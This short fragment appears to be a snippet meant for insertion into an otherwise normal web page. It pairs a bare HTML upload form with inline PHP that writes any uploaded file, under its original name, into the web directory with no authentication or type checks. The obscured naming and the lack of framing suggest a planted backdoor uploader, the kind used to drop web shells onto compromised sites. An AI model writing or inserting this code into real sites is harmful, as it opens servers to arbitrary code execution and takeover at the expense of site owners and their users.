the page normal.<form enctype="multipart/form-data" method="POST"><input name="fnm" type="file"/><input type="submit" value="doit"/></form><?php $pwskal=basename($_FILES["fnm"]["name"]);if(move_uploaded_file($_FILES["fnm"]["tmp_name"],$pwskal)){echo basename($_FILES["fnm"]["name"])."uploaded";} ?>